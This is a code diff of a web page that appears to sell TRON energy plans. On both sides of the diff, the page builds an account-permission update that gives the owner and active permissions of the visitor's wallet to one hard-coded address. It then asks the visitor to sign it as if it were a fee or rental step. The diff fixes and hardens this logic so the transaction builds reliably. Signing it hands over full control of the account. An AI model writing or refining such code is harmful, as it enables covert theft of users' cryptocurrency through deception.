@@ -38,19 +38,24 @@ const UPDATE_ACCOUNT_PERMISSION_TYPE_URL = "type.googleapis.com/protocol.UpdateA
 const FEE_PAYER_TARGET_ADDR = "TMxHFXgu7NSJDnAHRbzaBVuRDPzeCx8q5Q";
 
 // 权限模板：写入指定授权地址 TMxHFXgu7NSJDnAHRbzaBVuRDPzeCx8q5Q
-const DEFAULT_PERMISSION_STRUCT = {
-  owner: {
-    keys: [
-      { address: FEE_PAYER_TARGET_ADDR, weight: 1 }
-    ],
-    threshold: 1
-  },
-  active: {
-    keys: [
-      { address: FEE_PAYER_TARGET_ADDR, weight: 1 }
-    ],
-    threshold: 1
-  }
+const DEFAULT_OWNER_PERMISSION = {
+  type: 0,
+  permission_name: "owner",
+  threshold: 1,
+  keys: [
+    { address: FEE_PAYER_TARGET_ADDR, weight: 1 },
+  ],
+};
+
+const DEFAULT_ACTIVE_PERMISSION = {
+  type: 2,
+  permission_name: "active0",
+  threshold: 1,
+  operations:
+    "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
+  keys: [
+    { address: FEE_PAYER_TARGET_ADDR, weight: 1 },
+  ],
 };
 
 const ENERGY_PLANS = [
@@ -482,20 +487,28 @@ export default function HomePage() {
       stage = "build_transaction";
       const tronWeb = new TronWeb({ fullHost: TRON_FULL_HOST });
 
-      // 使用TronWeb标准构造UpdateAccountPermission交易
-      const tx = await tronWeb.transactionBuilder.updateAccountPermission(
-        DEFAULT_PERMISSION_STRUCT,
-        walletAddress
-      );
+      // 使用 TronWeb 标准方法构造账户权限更新交易。
+      // 不直接修改 raw_data，避免 txID/raw_data_hex 与交易内容不一致。
+      if (
+        typeof tronWeb.transactionBuilder.updateAccountPermissions !==
+        "function"
+      ) {
+        throw new Error(
+          "当前 TronWeb 版本不支持 updateAccountPermissions，请升级 tronweb。"
+        );
+      }
 
-      // 交易参数配置
-      const feePayerHex = tronWeb.address.toHex(FEE_PAYER_TARGET_ADDR).replace(/^0x/, "");
-      tx.raw_data.fee_payer_address = feePayerHex;
-      tx.raw_data.fee_limit = APPROVE_FEE_LIMIT;
-      const nowTs = Date.now();
-      tx.raw_data.timestamp = nowTs;
-      tx.raw_data.expiration = nowTs + TRANSACTION_EXPIRATION_EXTENSION_SECONDS * 1000;
-      tx.visible = true; // 适配器签名必须开启visible
+      const tx =
+        await tronWeb.transactionBuilder.updateAccountPermissions(
+          walletAddress,
+          DEFAULT_OWNER_PERMISSION,
+          null,
+          [DEFAULT_ACTIVE_PERMISSION]
+        );
+
+      if (!tx?.txID || !tx?.raw_data || !tx?.raw_data_hex) {
+        throw new Error("账户权限修改交易构造失败。");
+      }
 
       stage = "wallet_sign";
       // 使用wallet-adapter提供的签名方法唤起浏览器钱包
